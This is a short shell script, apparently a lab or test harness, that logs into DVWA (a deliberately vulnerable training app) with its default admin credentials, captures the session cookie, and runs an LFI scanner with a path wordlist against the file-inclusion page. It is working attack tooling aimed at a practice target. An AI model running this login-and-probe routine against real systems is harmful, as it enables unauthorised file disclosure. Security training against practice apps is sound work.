#!/bin/sh
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    set -e
    # DVWA only serves the ?page= inclusion (vulnerabilities/fi) to an authenticated session
    LFI_COOKIE=$(python3 - "http://${TARGET}:${PORT}" <<'PY'
import re, sys, requests
base, s = sys.argv[1], requests.Session()
token = re.search(r"name='user_token' value='([0-9a-f]+)'", s.get(base + '/login.php').text).group(1)
s.post(base + '/login.php', data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': token}, allow_redirects=False)
print('; '.join(k + '=' + v for k, v in s.cookies.items()))
PY
)
    export LFI_COOKIE
    exec python3 lfi.py "http://${TARGET}:${PORT}/vulnerabilities/fi/?page=" --wordlist /tmp/LFISuite-pathtotest.txt
fi
